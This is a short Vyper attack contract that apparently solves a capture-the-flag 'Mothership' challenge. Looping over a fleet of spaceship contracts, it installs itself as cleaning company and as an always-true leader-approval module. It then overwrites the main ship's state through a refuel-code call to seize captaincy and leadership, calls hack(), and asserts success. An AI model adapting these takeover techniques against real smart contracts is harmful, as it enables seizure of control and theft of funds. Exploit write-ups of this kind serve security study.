# @version ^0.3.7

interface ICleaningModule:
    def replaceCleaningCompany(
        _cleaningCompany: address
    ): nonpayable

interface IRefuelModule:
    def addAlternativeRefuelStationsCodes(
        refuelStationCode: uint256
    ): nonpayable

interface IMothership:
    def fleet(index: uint256) -> address: view
    def promoteToLeader(_leader: address): nonpayable
    def hack(): nonpayable
    def hacked() -> bool: view

interface ISpaceship:
    def addModule(
        _moduleSig: bytes4,
        _moduleAddress: address,
    ): nonpayable
    def askForNewCaptain(
        _newCaptain: address
    ): nonpayable

owner: immutable(address)

ship: IMothership

@external
@payable
def __init__(_ship: address):
    owner = msg.sender
    self.ship = IMothership(_ship)

@external
def attack():
    assert msg.sender == owner, "!owner"
    for i in range(5):
        spaceship: address = self.ship.fleet(i)
        ICleaningModule(spaceship).replaceCleaningCompany(self)
        ISpaceship(spaceship).addModule(
            convert(method_id("isLeaderApproved(address)"), bytes4),
            self,
        )
    mainship: address = self.ship.fleet(0)
    ICleaningModule(mainship).replaceCleaningCompany(empty(address))
    IRefuelModule(mainship).addAlternativeRefuelStationsCodes( 
        convert(convert(self, uint160), uint256)
    )
    ISpaceship(mainship).askForNewCaptain(self)
    self.ship.promoteToLeader(self)
    self.ship.hack()
    assert self.ship.hacked(), "!hacked"

@external
@pure
def isLeaderApproved(leader: address) -> bool:
    return True
